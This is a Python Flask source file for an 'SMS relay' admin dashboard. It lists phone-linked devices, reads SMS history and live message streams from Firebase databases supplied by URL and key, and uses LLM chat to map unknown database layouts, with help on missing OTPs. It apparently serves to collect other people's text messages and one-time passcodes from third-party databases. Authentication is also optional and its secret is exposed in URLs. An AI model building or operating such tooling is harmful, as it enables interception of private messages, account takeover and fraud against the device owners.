"""
admin_web.py — SMS Relay Admin Dashboard  v3
=============================================
Run: python3 admin_web.py

AI Providers (via api.g0i.ai):
  - qwen3-coder-80b  →  Firebase structure analysis
  - claude-sonnet-4.6  →  Admin chat

Env vars:
  OPENAI_API_KEY   — api.g0i.ai key (OpenAI-compatible)
  ANT_API_KEY      — api.g0i.ai key (Anthropic-compatible)
  TG_BOT_TOKEN     — Telegram bot token for alerts
  TG_ADMIN_IDS     — comma-separated admin Telegram IDs
  RELAY_DB_PATH    — path to office_relay.db  (default: ./office_relay.db)
  ADMIN_PORT       — web port                 (default: 8080)
  ADMIN_SECRET     — dashboard password       (leave blank = no auth)
"""

import asyncio, json, os, re, sqlite3, threading, time
from datetime import datetime

import subprocess, sys
def _install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])

try:
    from flask import Flask, request, jsonify, Response, stream_with_context
except ImportError:
    _install("flask")
    from flask import Flask, request, jsonify, Response, stream_with_context

try:
    import aiohttp
except ImportError:
    _install("aiohttp"); import aiohttp

try:
    from openai import OpenAI
except ImportError:
    _install("openai"); from openai import OpenAI

try:
    import anthropic
except ImportError:
    _install("anthropic"); import anthropic

from fb_parser import (
    parse_db_full, fetch_sms_history, fetch_latest_sms,
    ai_learn_structure, load_learned_pattern, list_learned_patterns,
    save_learned_pattern, DeviceEntry, tg_alert,
)

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════

OPENAI_KEY   = os.environ.get("OPENAI_API_KEY", "")
ANT_KEY      = os.environ.get("ANT_API_KEY", "")
BOT_TOKEN    = os.environ.get("TG_BOT_TOKEN", "")
ADMIN_IDS    = [int(x) for x in os.environ.get("TG_ADMIN_IDS","").split(",") if x.strip().isdigit()]
DB_PATH      = os.environ.get("RELAY_DB_PATH", "office_relay.db")
ADMIN_PORT   = int(os.environ.get("ADMIN_PORT", "8080"))
ADMIN_SECRET = os.environ.get("ADMIN_SECRET", "")

# ── AI Clients ────────────────────────────────────────────────
# qwen3-coder-80b  via OpenAI-compatible endpoint
_qwen_client = None
if OPENAI_KEY:
    _qwen_client = OpenAI(base_url="https://api.g0i.ai/v1", api_key=OPENAI_KEY)

# claude-sonnet-4.6  via Anthropic-compatible endpoint
_ant_client = None
if ANT_KEY:
    _ant_client = anthropic.Anthropic(base_url="https://api.g0i.ai", api_key=ANT_KEY)

# ═══════════════════════════════════════════════════════════════
# FLASK APP
# ═══════════════════════════════════════════════════════════════

app = Flask(__name__)
_chat_history: list[dict] = []

_AI_SYSTEM = """You are an expert assistant for an SMS relay admin panel.
You help the admin:
1. Debug Firebase database connection and parsing issues
2. Analyze why devices appear as ghost (no phone number stored)
3. Explain newly learned Firebase database structures
4. Suggest fixes for OTP not being received
5. Answer questions about the bot's behavior and data

Be concise, direct, and technical. Use emojis to make responses readable.
When the admin pastes a Firebase URL, tell them you'll analyze it."""

# ═══════════════════════════════════════════════════════════════
# DB HELPERS
# ═══════════════════════════════════════════════════════════════

def _db():
    if not os.path.exists(DB_PATH): return None
    c = sqlite3.connect(DB_PATH); c.row_factory = sqlite3.Row; return c

def get_all_numbers():
    c = _db()
    if not c: return []
    try:
        rows = c.execute("""
            SELECT n.*, f.url as fb_url, f.label as fb_label, f.api_key as fb_api_key
            FROM numbers n
            LEFT JOIN firebase_sources f ON n.fb_source = f.url
            ORDER BY n.status DESC, n.number ASC
        """).fetchall()
        return [dict(r) for r in rows]
    except Exception: return []
    finally: c.close()

def get_firebase_sources():
    c = _db()
    if not c: return []
    try:
        rows = c.execute("SELECT * FROM firebase_sources ORDER BY added_at DESC").fetchall()
        return [dict(r) for r in rows]
    except Exception: return []
    finally: c.close()

def get_sms_log(number: str = None, limit: int = 50):
    c = _db()
    if not c: return []
    try:
        if number:
            rows = c.execute(
                "SELECT * FROM sms_log WHERE number=? ORDER BY received_at DESC LIMIT ?",
                (number, limit)).fetchall()
        else:
            rows = c.execute(
                "SELECT * FROM sms_log ORDER BY received_at DESC LIMIT ?", (limit,)).fetchall()
        return [dict(r) for r in rows]
    except Exception: return []
    finally: c.close()

def get_device_by_number(number: str):
    c = _db()
    if not c: return None
    try:
        row = c.execute(
            "SELECT n.*, f.api_key as fb_api_key FROM numbers n "
            "LEFT JOIN firebase_sources f ON n.fb_source = f.url WHERE n.number=?",
            (number,)).fetchone()
        return dict(row) if row else None
    except Exception: return None
    finally: c.close()

# ═══════════════════════════════════════════════════════════════
# AUTH
# ═══════════════════════════════════════════════════════════════

def _check_auth():
    if not ADMIN_SECRET: return True
    token = request.headers.get("X-Admin-Secret") or request.args.get("secret")
    return token == ADMIN_SECRET

# ═══════════════════════════════════════════════════════════════
# ROUTES — DEVICES
# ═══════════════════════════════════════════════════════════════

@app.route("/api/devices")
def api_devices():
    if not _check_auth(): return jsonify({"error":"Unauthorized"}), 401
    numbers = get_all_numbers()
    return jsonify({"devices": numbers, "total": len(numbers)})

@app.route("/api/firebase_sources")
def api_firebase_sources():
    if not _check_auth(): return jsonify({"error":"Unauthorized"}), 401
    return jsonify({"sources": get_firebase_sources()})

@app.route("/api/sms_log")
def api_sms_log():
    if not _check_auth(): return jsonify({"error":"Unauthorized"}), 401
    number = request.args.get("number")
    limit  = int(request.args.get("limit", 50))
    return jsonify({"messages": get_sms_log(number, limit)})

# ═══════════════════════════════════════════════════════════════
# ROUTES — LIVE MESSAGE HISTORY
# ═══════════════════════════════════════════════════════════════

@app.route("/api/messages/<path:number>")
def api_messages(number):
    if not _check_auth(): return jsonify({"error":"Unauthorized"}), 401
    device = get_device_by_number(number)
    if not device: return jsonify({"error":"Device not found"}), 404
    sms_path  = device.get("sms_path", "")
    api_key   = device.get("fb_api_key")
    fb_source = device.get("fb_source", "")
    if not sms_path:
        return jsonify({"messages": get_sms_log(number, 50), "source": "db"})
    pattern = load_learned_pattern(fb_source) if fb_source else None
    entry = DeviceEntry(
        number=number, device_id=device.get("device_id",""),
        device_name=device.get("device_name",""), sms_path=sms_path,
        struct_type=device.get("struct_type","?"),
    )
    limit = int(request.args.get("limit", 50))
    loop  = asyncio.new_event_loop()
    try:
        history = loop.run_until_complete(
            fetch_sms_history(entry, limit=limit, api_key=api_key, pattern=pattern))
    finally:
        loop.close()
    return jsonify({"messages": history, "source": "firebase", "total": len(history)})

# ═══════════════════════════════════════════════════════════════
# ROUTES — FIREBASE ANALYSIS
# ═══════════════════════════════════════════════════════════════

@app.route("/api/analyze", methods=["POST"])
def api_analyze():
    if not _check_auth(): return jsonify({"error":"Unauthorized"}), 401
    data    = request.get_json() or {}
    url     = data.get("url","").strip()
    api_key = data.get("api_key","").strip() or None
    if not url: return jsonify({"error":"url is required"}), 400
    loop = asyncio.new_event_loop()
    try:
        entries, stype, err = loop.run_until_complete(
            parse_db_full(url, api_key, OPENAI_KEY or None, BOT_TOKEN, ADMIN_IDS))
    finally:
        loop.close()
    real   = [e.to_dict() for e in entries if not e.is_ghost]
    ghosts = [e.to_dict() for e in entries if e.is_ghost]
    return jsonify({"struct_type":stype,"error":err,"total":len(entries),
                    "real_count":len(real),"ghost_count":len(ghosts),
                    "real":real[:50],"ghosts":ghosts[:20]})

@app.route("/api/learned_patterns")
def api_learned_patterns():
    if not _check_auth(): return jsonify({"error":"Unauthorized"}), 401
    return jsonify({"patterns": list_learned_patterns()})

@app.route("/api/ai/analyze_url", methods=["POST"])
def api_ai_analyze_url():
    if not _check_auth(): return jsonify({"error":"Unauthorized"}), 401
    if not OPENAI_KEY: return jsonify({"error":"OPENAI_API_KEY not set"}), 400
    data    = request.get_json() or {}
    url     = data.get("url","").strip()
    api_key = data.get("api_key","").strip() or None
    if not url: return jsonify({"error":"url is required"}), 400
    loop = asyncio.new_event_loop()
    try:
        entries, pattern, err = loop.run_until_complete(
            ai_learn_structure(url, api_key, OPENAI_KEY, BOT_TOKEN, ADMIN_IDS))
    finally:
        loop.close()
    if err: return jsonify({"success":False,"error":err})
    return jsonify({
        "success":True, "pattern":pattern, "total":len(entries),
        "real_count":sum(1 for e in entries if not e.is_ghost),
        "ghost_count":sum(1 for e in entries if e.is_ghost),
        "devices":[e.to_dict() for e in entries[:20]],
    })

# ═══════════════════════════════════════════════════════════════
# ROUTES — AI CHAT  (claude-sonnet-4.6 via api.g0i.ai)
# ═══════════════════════════════════════════════════════════════

@app.route("/api/ai/chat", methods=["POST"])
def api_ai_chat():
    if not _check_auth(): return jsonify({"error":"Unauthorized"}), 401

    # Prefer Anthropic (claude-sonnet-4.6) for chat; fallback to qwen
    if not _ant_client and not _qwen_client:
        return jsonify({"reply":"⚠️ No AI key set. Add ANT_API_KEY or OPENAI_API_KEY.", "action":None})

    data    = request.get_json() or {}
    message = data.get("message","").strip()
    if not message: return jsonify({"error":"message required"}), 400

    # Detect Firebase URL in message
    fb_url_match = re.search(r'https://[\w-]+-default-rtdb\.firebaseio\.com[^\s]*', message)
    action       = None
    extra_ctx    = ""

    if fb_url_match:
        fb_url = fb_url_match.group(0)
        base   = fb_url.replace("/.json","").replace(".json","").rstrip("/")
        existing = load_learned_pattern(base)
        if existing:
            extra_ctx = f"\n\n[SYSTEM: Learned pattern exists for this DB: {json.dumps(existing)}]"
            action = "has_pattern"
        else:
            extra_ctx = "\n\n[SYSTEM: This is an unknown Firebase URL — analyzing in background...]"
            action = "analyzing"

    # Attach learned patterns context
    patterns = list_learned_patterns()
    sys_ctx  = _AI_SYSTEM
    if patterns:
        sys_ctx += f"\n\nLearned patterns ({len(patterns)}):\n"
        for p in patterns[:5]:
            sys_ctx += f"- {p.get('db_host','?')}: {p.get('pattern_id','?')}, sms→{p.get('sms_root','?')}\n"

    _chat_history.append({"role":"user","content": message + extra_ctx})
    if len(_chat_history) > 20:
        _chat_history.pop(0)

    try:
        if _ant_client:
            # claude-sonnet-4.6
            resp = _ant_client.messages.create(
                model="claude-sonnet-4.6",
                max_tokens=900,
                system=sys_ctx,
                messages=_chat_history[-10:],
            )
            reply = resp.content[0].text
        else:
            # qwen3-coder-80b fallback
            resp  = _qwen_client.chat.completions.create(
                model="qwen3-coder-80b",
                messages=[{"role":"system","content":sys_ctx}] + _chat_history[-10:],
                temperature=0.4,
                max_tokens=800,
            )
            reply = resp.choices[0].message.content
        _chat_history.append({"role":"assistant","content":reply})
    except Exception as e:
        return jsonify({"reply":f"❌ AI error: {e}", "action":None})

    # Background AI learning if new Firebase URL detected
    if action == "analyzing" and fb_url_match:
        fb_url  = fb_url_match.group(0)
        fb_key  = data.get("fb_api_key")
        def _bg():
            loop = asyncio.new_event_loop()
            try:
                loop.run_until_complete(
                    ai_learn_structure(fb_url, fb_key, OPENAI_KEY, BOT_TOKEN, ADMIN_IDS))
            except Exception as ex:
                print(f"[admin_web] bg AI learn error: {ex}")
            finally:
                loop.close()
        threading.Thread(target=_bg, daemon=True).start()
        action = "learning_started"

    return jsonify({"reply":reply, "action":action})


@app.route("/api/ai/clear_chat", methods=["POST"])
def api_ai_clear_chat():
    _chat_history.clear()
    return jsonify({"ok":True})

# ═══════════════════════════════════════════════════════════════
# SSE — LIVE MESSAGES
# ═══════════════════════════════════════════════════════════════

@app.route("/api/live/<path:number>")
def api_live(number):
    if not _check_auth():
        return Response('data: {"error":"Unauthorized"}\n\n', mimetype="text/event-stream")
    device = get_device_by_number(number)
    if not device:
        return Response('data: {"error":"Not found"}\n\n', mimetype="text/event-stream")
    sms_path  = device.get("sms_path","")
    api_key   = device.get("fb_api_key")
    fb_source = device.get("fb_source","")
    pattern   = load_learned_pattern(fb_source) if fb_source else None
    entry     = DeviceEntry(
        number=number, device_id=device.get("device_id",""),
        device_name=device.get("device_name",""), sms_path=sms_path,
        struct_type=device.get("struct_type","?"),
    )
    last_key = [None]

    def generate():
        yield f"data: {json.dumps({'type':'connected','number':number})}\n\n"
        while True:
            try:
                loop = asyncio.new_event_loop()
                history = loop.run_until_complete(
                    fetch_sms_history(entry, limit=5, api_key=api_key, pattern=pattern))
                loop.close()
                if history:
                    newest = history[0].get("key")
                    if newest != last_key[0]:
                        if last_key[0] is not None:
                            new_msgs = []
                            for m in history:
                                if m.get("key") == last_key[0]: break
                                new_msgs.append(m)
                            for m in reversed(new_msgs):
                                yield f"data: {json.dumps({'type':'sms',**m})}\n\n"
                        last_key[0] = newest
            except Exception as e:
                yield f"data: {json.dumps({'type':'error','msg':str(e)})}\n\n"
            time.sleep(10)

    return Response(stream_with_context(generate()), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

# ═══════════════════════════════════════════════════════════════
# MAIN UI
# ═══════════════════════════════════════════════════════════════

@app.route("/")
def index():
    sp = f"?secret={ADMIN_SECRET}" if ADMIN_SECRET else ""
    html = open(os.path.join(os.path.dirname(__file__), "templates", "admin.html")).read()
    return html.replace("__SECRET_PARAM__", sp).replace("__ADMIN_SECRET__", ADMIN_SECRET)


if __name__ == "__main__":
    ai_status = []
    if _ant_client:  ai_status.append("claude-sonnet-4.6 ✅")
    if _qwen_client: ai_status.append("qwen3-coder-80b ✅")
    if not ai_status: ai_status.append("❌ No AI key set")

    print(f"""
╔══════════════════════════════════════════════════╗
  SMS Relay Admin Dashboard  v3
  http://localhost:{ADMIN_PORT}
  AI Chat:    {' | '.join(ai_status)}
  TG Alerts:  {"✅ " + str(len(ADMIN_IDS)) + " admin(s)" if BOT_TOKEN and ADMIN_IDS else "❌ Set TG_BOT_TOKEN + TG_ADMIN_IDS"}
  DB:         {DB_PATH}
╚══════════════════════════════════════════════════╝
""")
    app.run(host="0.0.0.0", port=ADMIN_PORT, debug=False, threaded=True)
